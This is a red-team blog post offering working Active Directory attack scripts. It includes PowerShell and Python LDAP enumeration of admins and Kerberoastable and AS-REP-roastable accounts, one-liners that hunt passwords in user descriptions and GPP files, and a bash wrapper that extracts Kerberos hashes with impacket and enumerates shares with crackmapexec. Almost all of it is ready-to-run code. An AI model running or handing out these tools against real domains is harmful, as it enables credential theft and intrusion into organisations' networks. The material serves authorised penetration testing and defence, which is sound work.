---
title: "AD Enumeration Toolkit: Scripts I Actually Use"
date: 2026-01-06
categories: Tools Red-team
excerpt: "PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners."
tags:
  - active-directory
  - enumeration
  - powershell
  - python
  - red-team
toc: true
toc_sticky: true
header:
  teaser: /assets/images/tools-scripts.svg
  overlay_image: /assets/images/tools-scripts.svg
  overlay_filter: 0.7
---

Every red team engagement against Active Directory starts the same way: enumeration. Before you can exploit anything, you need to understand the environment. These are the scripts and one-liners I've built up over time that I actually use on engagements.

No fluff. Just working code.

## Initial Domain Enumeration

First things first - basic domain information. This wrapper script pulls essential info quickly.

### Quick Domain Info (PowerShell)

```powershell
# ad-quickenum.ps1
# Fast domain enumeration - run from domain-joined or with runas

function Get-DomainQuickInfo {
    param(
        [string]$Domain = $env:USERDNSDOMAIN
    )

    Write-Host "[*] Enumerating: $Domain" -ForegroundColor Cyan

    # Domain Controllers
    Write-Host "`n[+] Domain Controllers:" -ForegroundColor Green
    $dcs = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
    $dcs | ForEach-Object {
        Write-Host "    $($_.Name) - $($_.IPAddress)"
    }

    # Forest info
    Write-Host "`n[+] Forest Information:" -ForegroundColor Green
    $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    Write-Host "    Forest: $($forest.Name)"
    Write-Host "    Forest Mode: $($forest.ForestMode)"
    Write-Host "    Domains in Forest: $($forest.Domains.Count)"

    # Trust relationships
    Write-Host "`n[+] Domain Trusts:" -ForegroundColor Green
    try {
        $trusts = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
        if ($trusts.Count -eq 0) {
            Write-Host "    No trusts found"
        } else {
            $trusts | ForEach-Object {
                Write-Host "    $($_.TargetName) - $($_.TrustDirection) - $($_.TrustType)"
            }
        }
    } catch {
        Write-Host "    Unable to enumerate trusts"
    }

    # Password policy
    Write-Host "`n[+] Password Policy:" -ForegroundColor Green
    $policy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
    if ($policy) {
        Write-Host "    Min Length: $($policy.MinPasswordLength)"
        Write-Host "    Lockout Threshold: $($policy.LockoutThreshold)"
        Write-Host "    Lockout Duration: $($policy.LockoutDuration)"
        Write-Host "    Password History: $($policy.PasswordHistoryCount)"
    }
}

Get-DomainQuickInfo
```

### LDAP Enumeration Without AD Module (Python)

When you can't use PowerShell AD modules, LDAP queries work. This script requires network access to a DC.

```python
#!/usr/bin/env python3
"""
ad_enum.py - LDAP-based AD enumeration
Works without domain-joined machine, just needs creds and DC access
"""

import ldap3
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
import argparse
import sys

class ADEnumerator:
    def __init__(self, dc_ip, domain, username, password):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.conn = None
        self.base_dn = self._domain_to_dn(domain)

    def _domain_to_dn(self, domain):
        """Convert domain.local to DC=domain,DC=local"""
        return ','.join([f'DC={part}' for part in domain.split('.')])

    def connect(self):
        """Establish LDAP connection"""
        try:
            server = Server(self.dc_ip, get_info=ALL)
            self.conn = Connection(
                server,
                user=f'{self.domain}\\{self.username}',
                password=self.password,
                authentication=NTLM,
                auto_bind=True
            )
            print(f"[+] Connected to {self.dc_ip}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def get_users(self, enabled_only=True):
        """Enumerate domain users"""
        if enabled_only:
            # Filter for enabled accounts only
            search_filter = '(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
        else:
            search_filter = '(&(objectClass=user)(objectCategory=person))'

        self.conn.search(
            self.base_dn,
            search_filter,
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'description', 'memberOf', 'pwdLastSet', 'lastLogon']
        )

        users = []
        for entry in self.conn.entries:
            users.append({
                'username': str(entry.sAMAccountName),
                'description': str(entry.description) if entry.description else '',
                'groups': [str(g) for g in entry.memberOf] if entry.memberOf else []
            })

        return users

    def get_computers(self):
        """Enumerate domain computers"""
        search_filter = '(objectClass=computer)'

        self.conn.search(
            self.base_dn,
            search_filter,
            search_scope=SUBTREE,
            attributes=['name', 'operatingSystem', 'operatingSystemVersion', 'dNSHostName']
        )

        computers = []
        for entry in self.conn.entries:
            computers.append({
                'name': str(entry.name),
                'os': str(entry.operatingSystem) if entry.operatingSystem else 'Unknown',
                'dns': str(entry.dNSHostName) if entry.dNSHostName else ''
            })

        return computers

    def get_domain_admins(self):
        """Get Domain Admins group members"""
        search_filter = '(&(objectClass=group)(cn=Domain Admins))'

        self.conn.search(
            self.base_dn,
            search_filter,
            search_scope=SUBTREE,
            attributes=['member']
        )

        if self.conn.entries:
            members = self.conn.entries[0].member if self.conn.entries[0].member else []
            return [str(m).split(',')[0].replace('CN=', '') for m in members]
        return []

    def find_spn_accounts(self):
        """Find accounts with SPNs set (Kerberoastable)"""
        search_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))'

        self.conn.search(
            self.base_dn,
            search_filter,
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf']
        )

        spn_accounts = []
        for entry in self.conn.entries:
            spn_accounts.append({
                'username': str(entry.sAMAccountName),
                'spns': [str(spn) for spn in entry.servicePrincipalName]
            })

        return spn_accounts

    def find_asreproastable(self):
        """Find accounts that don't require pre-auth"""
        # DONT_REQ_PREAUTH = 0x400000 (4194304)
        search_filter = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

        self.conn.search(
            self.base_dn,
            search_filter,
            search_scope=SUBTREE,
            attributes=['sAMAccountName']
        )

        return [str(entry.sAMAccountName) for entry in self.conn.entries]


def main():
    parser = argparse.ArgumentParser(description='AD LDAP Enumeration')
    parser.add_argument('-dc', required=True, help='Domain Controller IP')
    parser.add_argument('-d', '--domain', required=True, help='Domain name')
    parser.add_argument('-u', '--user', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    args = parser.parse_args()

    enum = ADEnumerator(args.dc, args.domain, args.user, args.password)

    if not enum.connect():
        sys.exit(1)

    print("\n" + "="*60)
    print("[*] Domain Admins")
    print("="*60)
    for admin in enum.get_domain_admins():
        print(f"    {admin}")

    print("\n" + "="*60)
    print("[*] Kerberoastable Accounts (SPNs)")
    print("="*60)
    for acc in enum.find_spn_accounts():
        print(f"    {acc['username']}")
        for spn in acc['spns'][:3]:  # First 3 SPNs
            print(f"        -> {spn}")

    print("\n" + "="*60)
    print("[*] AS-REP Roastable Accounts")
    print("="*60)
    asrep = enum.find_asreproastable()
    if asrep:
        for acc in asrep:
            print(f"    {acc}")
    else:
        print("    None found")

    print("\n" + "="*60)
    print(f"[*] Users (Total: {len(enum.get_users())})")
    print("="*60)
    for user in enum.get_users()[:20]:  # First 20
        print(f"    {user['username']}")
        if user['description']:
            print(f"        Desc: {user['description'][:50]}")


if __name__ == '__main__':
    main()
```

## BloodHound Collection Without SharpHound

Sometimes you can't run SharpHound. This script creates BloodHound-compatible JSON using pure Python.

```python
#!/usr/bin/env python3
"""
bloodhound_lite.py - Lightweight BloodHound collection
For when SharpHound isn't an option
"""

import json
from datetime import datetime
from ad_enum import ADEnumerator  # From previous script

def generate_bloodhound_users(enumerator):
    """Generate BloodHound users.json format"""
    users = enumerator.get_users(enabled_only=False)

    bh_users = {
        "data": [],
        "meta": {
            "methods": 0,
            "type": "users",
            "count": len(users),
            "version": 5
        }
    }

    for user in users:
        bh_users["data"].append({
            "ObjectIdentifier": f"{user['username']}@{enumerator.domain.upper()}",
            "Properties": {
                "name": f"{user['username']}@{enumerator.domain.upper()}",
                "domain": enumerator.domain.upper(),
                "description": user.get('description', ''),
                "enabled": True
            },
            "Aces": [],
            "SPNTargets": [],
            "HasSIDHistory": [],
            "PrimaryGroupSID": None
        })

    return bh_users


def save_collection(data, filename):
    """Save to JSON file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    full_filename = f"{timestamp}_{filename}"

    with open(full_filename, 'w') as f:
        json.dump(data, f, indent=2)

    print(f"[+] Saved: {full_filename}")
    return full_filename
```

## Quick Wins One-Liners

These are the commands I run first on every engagement.

### Find Users with Passwords in Description

```powershell
# PowerShell - Check descriptions for passwords
Get-ADUser -Filter * -Properties Description |
    Where-Object { $_.Description -match 'pass|pwd|cred' } |
    Select-Object Name, Description

# LDAP one-liner (from Linux)
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'password' \
    -b "DC=domain,DC=local" "(description=*pass*)" sAMAccountName description
```

### Find Computers with Unconstrained Delegation

```powershell
# These machines store TGTs - high value targets
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation |
    Select-Object Name, DNSHostName

# Check for constrained delegation too
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo |
    Select-Object Name, msDS-AllowedToDelegateTo
```

### GPO Enumeration for Quick Wins

```powershell
# Find GPOs with potential creds or interesting settings
Get-GPO -All | ForEach-Object {
    $gpo = $_
    $path = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies\{$($gpo.Id)}"

    # Check for Groups.xml (GPP passwords)
    $groupsXml = Join-Path $path "Machine\Preferences\Groups\Groups.xml"
    if (Test-Path $groupsXml) {
        Write-Host "[!] GPP Found: $($gpo.DisplayName)" -ForegroundColor Red
        Write-Host "    Path: $groupsXml"
    }

    # Check for ScheduledTasks.xml
    $tasksXml = Join-Path $path "Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    if (Test-Path $tasksXml) {
        Write-Host "[!] Scheduled Tasks GPO: $($gpo.DisplayName)" -ForegroundColor Yellow
    }
}
```

## Wrapping It Up: Enum Automation Script

This bash script chains common tools together for initial enumeration.

```bash
#!/bin/bash
# ad_auto_enum.sh - Automated AD enumeration wrapper

DC_IP=$1
DOMAIN=$2
USER=$3
PASS=$4
OUTPUT_DIR="./enum_$(date +%Y%m%d_%H%M%S)"

if [ -z "$DC_IP" ] || [ -z "$DOMAIN" ] || [ -z "$USER" ]; then
    echo "Usage: $0 <DC_IP> <DOMAIN> <USER> [PASS]"
    exit 1
fi

if [ -z "$PASS" ]; then
    read -s -p "Password: " PASS
    echo
fi

mkdir -p "$OUTPUT_DIR"
echo "[*] Output directory: $OUTPUT_DIR"

# DNS enumeration
echo "[*] Running DNS enumeration..."
dig @$DC_IP $DOMAIN any > "$OUTPUT_DIR/dns_any.txt" 2>&1
dig @$DC_IP -t SRV _ldap._tcp.$DOMAIN >> "$OUTPUT_DIR/dns_srv.txt" 2>&1

# Kerbrute user enumeration (if wordlist exists)
if [ -f "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" ]; then
    echo "[*] Running Kerbrute user enum..."
    kerbrute userenum -d $DOMAIN --dc $DC_IP \
        /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
        -o "$OUTPUT_DIR/kerbrute_users.txt" 2>/dev/null
fi

# GetNPUsers - AS-REP roasting
echo "[*] Checking AS-REP roastable users..."
impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP \
    -outputfile "$OUTPUT_DIR/asrep_hashes.txt" 2>/dev/null

# GetUserSPNs - Kerberoasting
echo "[*] Extracting Kerberoastable hashes..."
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP \
    -outputfile "$OUTPUT_DIR/kerberoast_hashes.txt" 2>/dev/null

# LDAP domain dump
echo "[*] Running ldapdomaindump..."
ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" ldap://$DC_IP \
    -o "$OUTPUT_DIR/ldap_dump" 2>/dev/null

# Enum4linux-ng
echo "[*] Running enum4linux-ng..."
enum4linux-ng -A -u "$USER" -p "$PASS" $DC_IP \
    -oA "$OUTPUT_DIR/enum4linux" 2>/dev/null

# SMB shares
echo "[*] Enumerating SMB shares..."
crackmapexec smb $DC_IP -u "$USER" -p "$PASS" --shares \
    > "$OUTPUT_DIR/smb_shares.txt" 2>&1

echo ""
echo "[+] Enumeration complete. Results in: $OUTPUT_DIR"
echo ""

# Quick summary
echo "=== Quick Wins ==="
if [ -s "$OUTPUT_DIR/asrep_hashes.txt" ]; then
    echo "[!] AS-REP hashes found - check $OUTPUT_DIR/asrep_hashes.txt"
fi
if [ -s "$OUTPUT_DIR/kerberoast_hashes.txt" ]; then
    echo "[!] Kerberoast hashes found - check $OUTPUT_DIR/kerberoast_hashes.txt"
fi
```

## Usage

```bash
# Make executable
chmod +x ad_auto_enum.sh

# Run against target
./ad_auto_enum.sh 10.10.10.100 corp.local john.doe 'Password123!'

# Check results
ls -la ./enum_*/
```

---

These scripts form the core of my AD enumeration workflow. They're not fancy, but they work. Modify them for your needs, add error handling if you're using them in production tools, and always test in a lab before an engagement.

Next up: automating the exploitation phase once you've found those juicy misconfigurations.
